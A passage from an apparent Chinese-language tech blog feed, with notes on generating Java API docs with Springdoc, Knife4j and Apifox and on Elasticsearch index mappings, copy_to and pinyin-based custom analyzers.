class="hljs-meta">@Operation(summary = <span class="hljs-string">&quot;创建用户&quot;</span>)</span><br><span class="hljs-meta">@PostMapping(<span class="hljs-string">&quot;/user&quot;</span>)</span><br><span class="hljs-keyword">public</span> User createUser(<span class="hljs-meta">@RequestBody</span> User user) &#123;<br><span class="hljs-comment">// 业务逻辑</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250517160013458.png"></p><hr><h4 id="2-8-访问-UI-文档"><a href="#2-8-访问-UI-文档" class="headerlink" title="2.8. 访问 UI 文档"></a>2.8. 访问 UI 文档</h4><p>UI 文档默认为： <a href="http://localhost:8080/swagger-ui/index.html">http://localhost:8080/swagger-ui/index.html</a></p><hr><h3 id="3-使用-Knife4j-生成-OpenAPI-文档"><a href="#3-使用-Knife4j-生成-OpenAPI-文档" class="headerlink" title="3. 使用 Knife4j 生成 OpenAPI 文档"></a>3. 使用 Knife4j 生成 OpenAPI 文档</h3><p><strong>Knife4j</strong> 基于 Swagger-UI，提供了更多功能、更友好的用户界面和强大的定制能力，从而显著提升了 API 文档的开发与使用体验。</p><p>与 <strong>Springfox</strong> 或 <strong>Springdoc</strong> 生成的 API 文档兼容，<strong>Knife4j</strong> 并不会引入新的 API 注解，而是通过优化和增强现有的文档功能来提升用户体验。</p><p>其使用方式与 <strong>Springdoc</strong> 生成 OpenAPI 文档的方法几乎相同，唯一的区别是引入的依赖包需要替换为 <a href="https://mvnrepository.com/artifact/com.github.xiaoymin/knife4j-openapi3-jakarta-spring-boot-starter">knife4j-openapi3-jakarta-spring-boot-starter</a>，而非 <code>springdoc-openapi-starter-webmvc-ui</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 此依赖，会自动引入 Springdoc 和 Swagger UI 的依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>knife4j-openapi3-jakarta-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在配置时，除了基本配置外，您还可以进行更多自定义配置，参考：<a href="https://doc.xiaominfo.com/docs/features/enhance">Knife4j 增强模式</a>。</p><p>然后我们可以访问 Knife4j UI 文档： <a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a></p><hr><h3 id="4-使用-Apifox"><a href="#4-使用-Apifox" class="headerlink" title="4. 使用 Apifox"></a>4. 使用 Apifox</h3><h4 id="4-1-创建-Java-项目"><a href="#4-1-创建-Java-项目" class="headerlink" title="4.1. 创建 Java 项目"></a>4.1. 创建 Java 项目</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250517161956335.png"></p><hr><h4 id="4-2-安装-Apifox-插件"><a href="#4-2-安装-Apifox-插件" class="headerlink" title="4.2. 安装 Apifox 插件"></a>4.2. 安装 Apifox 插件</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250517162033549.png"></p><hr><h4 id="4-3-创建团队和项目"><a href="#4-3-创建团队和项目" class="headerlink" title="4.3. 创建团队和项目"></a>4.3. 创建团队和项目</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250517162135984.png"></p><hr><h4 id="4-4-配置-Java-项目与-Apifox-项目映射关系"><a href="#4-4-配置-Java-项目与-Apifox-项目映射关系" class="headerlink" title="4.4. 配置 Java 项目与 Apifox 项目映射关系"></a>4.4. 配置 Java 项目与 Apifox 项目映射关系</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250517162243052.png"></p><hr><h4 id="4-5-上传-Java-项目"><a href="#4-5-上传-Java-项目" class="headerlink" title="4.5. 上传 Java 项目"></a>4.5. 上传 Java 项目</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E7%A8%8B%E5%BA%8F%E6%96%87%E6%A1%A3/image-20250517162530905.png"></p><hr>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>程序文档</category>
      
      <category>Java 文档</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：ElasticSearch 基础</title>
    <link href="/2025/04/13/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/04/13/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：ElasticSearch"><a href="#1-导图：Map：ElasticSearch" class="headerlink" title="1. 导图：Map：ElasticSearch"></a>1. 导图：<a href="../../maps/Map%EF%BC%9AElasticSearch.xmind">Map：ElasticSearch</a></h3><hr><h3 id="2-ElasticSearch-概述"><a href="#2-ElasticSearch-概述" class="headerlink" title="2. ElasticSearch 概述"></a>2. ElasticSearch 概述</h3><p>elasticsearch是一款非常强大的开源搜索引擎，可以帮助我们从海量数据中快速找到需要的内容</p><hr><h3 id="3-ES-语法"><a href="#3-ES-语法" class="headerlink" title="3. ES 语法"></a>3. ES 语法</h3><hr><h4 id="3-3-索引命令"><a href="#3-3-索引命令" class="headerlink" title="3.3. 索引命令"></a>3.3. 索引命令</h4><h5 id="3-3-1-创建索引"><a href="#3-3-1-创建索引" class="headerlink" title="3.3.1. 创建索引"></a>3.3.1. 创建索引</h5><h6 id="3-3-1-1-创建索引考虑事项"><a href="#3-3-1-1-创建索引考虑事项" class="headerlink" title="3.3.1.1. 创建索引考虑事项"></a>3.3.1.1. 创建索引考虑事项</h6><ol><li>&#x3D;&#x3D;索引库名称&#x3D;&#x3D;：<ol><li>ES索引通常对应数据库中的一张表，一个表根据业务需求可以对应多个ES索引</li><li>这里是一个模版：<ol><li><code>[项目名]_[表名] _ [业务名] _ [时间分片] _ [环境标识]</code>，例如： <code>myproject_order_transaction_20250427_prod</code></li><li><font color="#00b0f0">表名</font>：<ol><li>使用数据库表名的简化版或直接版</li><li>表名较短时可直接使用，如 <code>t_user</code> → <code>user</code>；</li><li>表名较长时可适当简化</li></ol></li><li><font color="#00b0f0">业务名</font>：<ol><li>表示索引解决的具体业务，如 <code>email</code>、<code>profile</code>、<code>address</code> 等</li></ol></li><li><font color="#00b0f0">时间分片</font>：<ol><li>便于管理大规模数据，如订单表每年10亿数据，可以按月、周、日进行分片</li></ol></li><li><font color="#00b0f0">环境标识</font>：<ol><li>用于区分不同环境，如 <code>local</code>、<code>dev</code>、<code>test</code>、<code>perf</code>、<code>prod</code> 等</li></ol></li></ol></li></ol></li><li>&#x3D;&#x3D;分片和副本数量&#x3D;&#x3D;</li><li>&#x3D;&#x3D;自定义分词器&#x3D;&#x3D;：<ol><li>分词器通常由三部分组成：<code>character filter</code>、<code>tokenizer</code> 和 <code>tokenizer filter</code>（简称 <code>filter</code>）</li><li>因此，在自定义分词器时，通常先分别自定义 <code>char_filter</code>、<code>tokenizer</code> 和 <code>filter</code>，然后再基于这些组件创建自定义的 <code>analyzer</code>。</li><li>当然，自定义分词器并不一定要包含所有三种组件，具体可以根据实际需求选择其中两种或全部三种进行配置</li></ol></li><li>&#x3D;&#x3D;刷新时间&#x3D;&#x3D;：</li><li>&#x3D;&#x3D;字段定义&#x3D;&#x3D;：<ol><li><font color="#00b0f0">字段名称</font>：<ol><li>通常与数据库字段名保持一致</li></ol></li><li><font color="#00b0f0">字段数据类型</font>：<ol><li>参照 <a href="https://blog.wangjia.xin/2025/04/12/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E4%BC%A0%E5%8F%82/#MySQL-ES">笔记：数据类型和传参</a></li></ol></li><li><font color="#00b0f0">插入文档时使用的分词器</font>：<ol><li>用于对文档内容进行分词，一般是使用自定义分词器</li><li>主要适用于 <code>text</code> 类型字段，非 <code>text</code> 字段无需且不能指定分词器，不打算使用这个 <code>text</code> 检索，也不需要指定分词器</li></ol></li><li><font color="#00b0f0">查询文档时使用的分词器</font>：<ol><li>用于对搜索内容进行分词，一般是使用 <code>ik_smart</code> 和 <code>ik_max_word</code></li><li>如果未显式指定，则默认使用该字段插入文档时使用的分词器</li></ol></li><li><font color="#00b0f0">是否为该字段创建倒排索引库</font>：<ol><li>如果只打算通过 <code>all</code> 字段进行搜索，而不需要对该字段进行精确查询，可以设置 <code>index: false</code>，以避免为该字段单独建立倒排索引，节省存储空间和索引构建时间。</li></ol></li><li><font color="#00b0f0">其他的 Mapping 属性</font><ol><li>参照 <a href="https://www.elastic.co/guide/en/elasticsearch/reference/8.18/mapping-params.html">ElasticSearch 文档</a></li></ol></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>一个索引库中并非只存在一份倒排索引，每个字段在设置了 <code>index: true</code> 后，都会单独创建一份倒排索引：<ul><li>各字段的倒排索引分别收集该字段在所有文档中的内容</li><li>搜索时，实际是通过每个字段对应的倒排索引查找匹配的文档，并按相关性打分，从高到低返回对应的文档 ID，最终返回文档内容</li></ul></li><li>为了简化跨字段搜索，我们通常会使用 <code>copy_to</code> 将多个字段的内容复制到一个统一的字段（如 <code>all</code> 字段），实现“一网打尽式”的搜索。但这种方式也带来一些问题：<ul><li><font color="#00b0f0">不该分词的字段分词了</font>：<ul><li><code>all</code> 字段通常是 <code>text</code> 类型，会进行分词处理。如果将 <code>keyword</code> 类型的字段内容也 <code>copy_to</code> 到 <code>all</code> 字段，它们在 <code>all</code> 中会被分词，破坏了原本用于精确匹配的特性，完全背离了它精确匹配的初衷</li><li>为了规避这种混乱，我们可以：<ul><li>可以将 <code>keyword</code> 字段复制到 <code>all</code> 字段，但自身仍保留独立索引（<code>index: true</code>）</li><li>精确查询时使用原字段，全文搜索时使用 <code>all</code> 字段，各司其职，互不干扰</li></ul></li></ul></li><li><font color="#00b0f0">索引浪费问题</font>：<ul><li>如果仅通过 <code>all</code> 字段进行搜索，而其他字段不进行单独查询，则可以将这些字段的 <code>index</code> 属性设置为 <code>false</code>，避免为每个字段建立独立的倒排索引，从而节省存储和提升索引效率。</li></ul></li></ul></li></ol></blockquote><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs applescript">PUT /&lt;索引库名称&gt;                                       <span class="hljs-comment"># 索引库名称</span><br>&#123;<br>    <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;number_of_shards&quot;</span>: <span class="hljs-number">3</span>,                         <span class="hljs-comment"># 分片数量</span><br>        <span class="hljs-string">&quot;number_of_replicas&quot;</span>: <span class="hljs-number">1</span>,                       <span class="hljs-comment"># 每个分片的副本数量</span><br>        <span class="hljs-string">&quot;refresh_interval&quot;</span>: <span class="hljs-string">&quot;1s&quot;</span>,                      <span class="hljs-comment"># 刷新时间</span><br>        <span class="hljs-string">&quot;analysis&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;char_filter&quot;</span>: &#123;                           <span class="hljs-comment"># 自定义 character filter</span><br>                <span class="hljs-string">&quot;my_char_filter&quot;</span>: &#123;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;tokenizer&quot;</span>: &#123;                             <span class="hljs-comment"># 自定义 tokenizer</span><br>                <span class="hljs-string">&quot;my_tokenizer&quot;</span>: &#123;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;filter&quot;</span>: &#123;                                <span class="hljs-comment"># 自定义 tokenizer filter</span><br>                <span class="hljs-string">&quot;my_tokenizer_filter&quot;</span>: &#123;<br>                &#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;analyzer&quot;</span>: &#123;                              <span class="hljs-comment"># 自定义过滤器</span><br>                <span class="hljs-string">&quot;my_analyzer&quot;</span> : &#123;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;mappings&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;&lt;字段名1&gt;&quot;</span>: &#123;                              <span class="hljs-comment"># 字段名称</span><br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;&lt;字段数据类型&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;analyzer&quot;</span>: <span class="hljs-string">&quot;&lt;插入文档时使用的分词器&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;search_analyzer&quot;</span>: <span class="hljs-string">&quot;&lt;查询文档时使用的分词器&gt;&quot;</span>,<br>                <span class="hljs-string">&quot;index&quot;</span>: <span class="hljs-literal">true</span>                          <span class="hljs-comment"># 创建倒排索引库</span><br>            &#125;,<br>            <span class="hljs-string">&quot;&lt;字段名2&gt;&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>,<br>                <span class="hljs-string">&quot;analyzer&quot;</span>: <span class="hljs-string">&quot;standard&quot;</span>,<br>                <span class="hljs-string">&quot;search_analyzer&quot;</span>: <span class="hljs-string">&quot;standard&quot;</span>,<br>                <span class="hljs-string">&quot;index&quot;</span>: <span class="hljs-literal">true</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h6 id="3-3-1-2-Copy-To-小技巧"><a href="#3-3-1-2-Copy-To-小技巧" class="headerlink" title="3.3.1.2. Copy To 小技巧"></a>3.3.1.2. Copy To 小技巧</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> <span class="hljs-keyword">Copy</span> <span class="hljs-keyword">To</span> <span class="hljs-keyword">All</span>（）<br>PUT /user_index<br>&#123;<br>  &quot;mappings&quot;: &#123;<br>    &quot;properties&quot;: &#123;<br>      &quot;username&quot;: &#123;<br>        &quot;type&quot;: &quot;text&quot;,<br>        &quot;analyzer&quot;: &quot;ik_smart&quot;,<br>        &quot;copy_to&quot;: &quot;all&quot;<br>      &#125;,<br>      &quot;email&quot;: &#123;<br>        &quot;type&quot;: &quot;keyword&quot;,<br>        &quot;index&quot;: <span class="hljs-keyword">false</span>,<br>        &quot;copy_to&quot;: &quot;all&quot;<br>      &#125;,<br>      &quot;profile&quot;: &#123;<br>        &quot;properties&quot;: &#123;<br>          &quot;gender&quot;: &#123;<br>            &quot;type&quot;: &quot;keyword&quot;,<br>        &quot;index&quot;: <span class="hljs-keyword">false</span>,                         // <span class="hljs-keyword">Object</span> 类型中的字段分别管理索引<br>            &quot;copy_to&quot;: &quot;all&quot;<br>          &#125;,<br>          &quot;age&quot;: &#123;<br>            &quot;type&quot;: &quot;integer&quot;,<br>&quot;index&quot;: <span class="hljs-keyword">false</span>,<br>            &quot;copy_to&quot;: &quot;all&quot;<br>          &#125;<br>        &#125;<br>      &#125;,<br>      &quot;all&quot;: &#123;<br>        &quot;type&quot;: &quot;text&quot;,<br>        &quot;analyzer&quot;: &quot;ik_max_word&quot;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><br># <span class="hljs-number">2.</span> 使用 <span class="hljs-keyword">Copy</span> <span class="hljs-keyword">To</span> 之前的搜索<br><span class="hljs-keyword">GET</span> /user_index/_search<br>&#123;<br>  &quot;query&quot;: &#123;<br>    &quot;bool&quot;: &#123;<br>      &quot;should&quot;: [<br>        &#123; &quot;match&quot;: &#123; &quot;username&quot;: &quot;johndoe&quot; &#125; &#125;,<br>        &#123; &quot;match&quot;: &#123; &quot;profile.gender&quot;: &quot;male&quot; &#125; &#125;,<br>        &#123; &quot;match&quot;: &#123; &quot;profile.age&quot;: &quot;18&quot; &#125; &#125;<br>      ]<br>    &#125;<br>  &#125;<br>&#125;<br><br><br># <span class="hljs-number">3.</span> 使用 <span class="hljs-keyword">Copy</span> <span class="hljs-keyword">To</span> 之后的搜索<br><span class="hljs-keyword">GET</span> /user_index/_search<br>&#123;<br>  &quot;query&quot;: &#123;<br>    &quot;match&quot;: &#123;<br>      &quot;all&quot;: &quot;johndoe male 18&quot;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="4-4-自定义分词器"><a href="#4-4-自定义分词器" class="headerlink" title="4.4. 自定义分词器"></a>4.4. 自定义分词器</h4><p>自定义分词器</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># 1. 模版</span><br>PUT /&lt;索引库名称&gt;<br>&#123;<br>  <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;analysis&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;analyzer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;my_analyzer&quot;</span>: &#123;                      <span class="hljs-comment">// 分词器名称（自定义）</span><br>          <span class="hljs-string">&quot;tokenizer&quot;</span>: <span class="hljs-string">&quot;ik_max_word&quot;</span>,<br>          <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-string">&quot;pinyin&quot;</span><br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><br><span class="hljs-meta"># 2. 示例（一个还不错的可生产用的自定义分词器，很好解决了我们的问题）</span><br>PUT /&lt;索引库名称&gt;<br>&#123;<br>  <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;analysis&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;analyzer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;my_analyzer&quot;</span>: &#123; <br>          <span class="hljs-string">&quot;tokenizer&quot;</span>: <span class="hljs-string">&quot;ik_max_word&quot;</span>,<br>          <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-string">&quot;py&quot;</span><br>        &#125;<br>      &#125;,<br>      <span class="hljs-string">&quot;filter&quot;</span>: &#123;                           <span class="hljs-comment">// 自定义 tokenizer filter</span><br>        <span class="hljs-string">&quot;py&quot;</span>: &#123; <br>          <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;pinyin&quot;</span>, <br>          <span class="hljs-string">&quot;keep_full_pinyin&quot;</span>: <span class="hljs-literal">false</span>,<br>          <span class="hljs-string">&quot;keep_joined_full_pinyin&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&quot;keep_original&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&quot;limit_first_letter_length&quot;</span>: <span class="hljs-number">16</span>,<br>          <span class="hljs-string">&quot;remove_duplicated_term&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-string">&quot;none_chinese_pinyin_tokenize&quot;</span>: <span class="hljs-literal">false</span><br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意：</p><ol><li>拼音分词器的更多配置可以上官网查阅</li></ol></blockquote><p>如家酒店还不错 -&gt; <code>[&quot;如家&quot;, &quot;rujia&quot;, &quot;rj&quot;, &quot;酒店&quot;, &quot;jiudian&quot;, &quot;jd&quot;, &quot;还不&quot;, &quot;haibu&quot;, &quot;hb&quot;, &quot;不错&quot;, &quot;bucuo&quot;, &quot;bc&quot;</code></p><p>感觉并没有实现r家这种搜索，虽然自定义分词器在创建索引的时候很好，插入文档后能很好的分词，很不错，，但是如果查询的时候还用这个分词器就不太好了，因为拼音有很多的同声字，例如shizi 有狮子、十字、师资、柿子、虱子等等等等<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AElasticSearch%20%E5%9F%BA%E7%A1%80/image-20250427210357524.png"></p><p>为了解决这个问头，我们只能创建索引时使用自定义索引，但是查询时不使用自定义索引，应该用户输入拼音，你就那拼音搜，输入中文，就拿中文搜</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">PUT <span class="hljs-string">/test</span><br>&#123;<br>  <span class="hljs-string">&quot;settings&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;analysis&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;analyzer&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;my_analyzer&quot;</span>: &#123;<br>          <span class="hljs-string">&quot;tokenizer&quot;</span>: <span class="hljs-string">&quot;ik_max_word&quot;</span>,<br>          <span class="hljs-string">&quot;filter&quot;</span>: <span class="hljs-string">&quot;py&quot;</span><br>        &#125;<br>      &#125;,<br>      <span class="hljs-string">&quot;filter&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;py&quot;</span>: &#123; <span class="hljs-string">...</span> &#125;<br>      &#125;<br>    &#125;<br>  &#125;,<br>  <span class="hljs-string">&quot;mappings&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;properties&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;name&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;text&quot;</span>,<br>        <span class="hljs-string">&quot;analyzer&quot;</span>: <span class="hljs-string">&quot;my_analyzer&quot;</span>,             <span class="hljs-string">//</span> 创建索引、插入文档<br>        <span class="hljs-string">&quot;search_analyzer&quot;</span>: <span class="hljs-string">&quot;ik_smart&quot;</span>          <span class="hljs-string">//</span> 搜索时<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="4-5-如何抉择分词器"><a href="#4-5-如何抉择分词器" class="headerlink" title="4.5. 如何抉择分词器"></a>4.5. 如何抉择分词器</h4><p>在为文档进行分词的时候，我们希望尽可能的分词，并且还希望同样为阴雨进行分词，例如：<code>[&quot;如家&quot;, &quot;rujia&quot;, &quot;rj&quot;, &quot;酒店&quot;, &quot;jiudian&quot;, &quot;jd&quot;, &quot;还不&quot;, &quot;haibu&quot;, &quot;hb&quot;, &quot;不错&quot;, &quot;bucuo&quot;, &quot;bc&quot;</code></p><p>所以在文档分词，即创建索引时，为字段的分词器为自定义分词器<br>但是在查询时，我们可能会输入 如家、rj、r家等等，如果还使用自定义分词器，发现如果还使用自定义分词器，我们输入 rj可能会查询到 人机、如家、软件、肉鸡等等，啊？？是这样吗？你再补充点，对了，如果r家这该怎么办，好像分词的时候没考虑这些问题啊。等等等等，一系列问题，你要为我总结出来用户可能输入的所有可能，然后我该怎么解决</p><p>所以为了避免这些一系列问题，我们推荐使用 ik_max_word 或者 ik_smart</p><hr><h3 id="5-ES-中文搜索优化方案"><a href="#5-ES-中文搜索优化方案" class="headerlink" title="5. ES 中文搜索优化方案"></a>5. ES 中文搜索优化方案</h3><h4 id="5-1-用户输入搜索信息的常见形式"><a href="#5-1-用户输入搜索信息的常见形式" class="headerlink" title="5.1. 用户输入搜索信息的常见形式"></a>5.1. 用户输入搜索信息的常见形式</h4><ol><li>&#x3D;&#x3D;全称&#x3D;&#x3D;：<ol><li>如家</li></ol></li><li>&#x3D;&#x3D;拼音全拼&#x3D;&#x3D;：<ol><li>rujia</li></ol></li><li>&#x3D;&#x3D;拼音缩写&#x3D;&#x3D;：<ol><li>rj</li></ol></li><li>&#x3D;&#x3D;汉字 + 拼音混合&#x3D;&#x3D;：<ol><li>r家</li></ol></li><li>&#x3D;&#x3D;谐音字&#x3D;&#x3D;：<ol><li>如加、如佳</li></ol></li><li>&#x3D;&#x3D;错别字&#x3D;&#x3D;：<ol><li>如加</li></ol></li></ol><hr><h1 id="Elasticsearch-处理谐音字和错别字的解决方案"><a href="#Elasticsearch-处理谐音字和错别字的解决方案" class="headerlink" title="Elasticsearch 处理谐音字和错别字的解决方案"></a>Elasticsearch 处理谐音字和错别字的解决方案</h1><p>在 Elasticsearch 中处理谐音字和错别字是中文搜索场景中的常见需求。针对您提到的”如加、如佳”谐音字问题和”如加”错别字问题，以下是完整的解决方案。</p><h2 id="谐音字处理方案"><a href="#谐音字处理方案" class="headerlink" title="谐音字处理方案"></a>谐音字处理方案</h2><h2 id="拼音分词器配置"><a href="#拼音分词器配置" class="headerlink" title="拼音分词器配置"></a>拼音分词器配置</h2><p>处理谐音字的核心是使用拼音分词器，通过将中文转换为拼音来实现同音字的匹配<a href="https://blog.csdn.net/LINING_GG/article/details/128212935">1</a>。</p><p>json</p><p><code>PUT /test_index &#123;   &quot;settings&quot;: &#123;    &quot;analysis&quot;: &#123;      &quot;analyzer&quot;: &#123;        &quot;my_pinyin_analyzer&quot;: &#123;          &quot;tokenizer&quot;: &quot;ik_max_word&quot;,          &quot;filter&quot;: [&quot;pinyin_filter&quot;]        &#125;      &#125;,      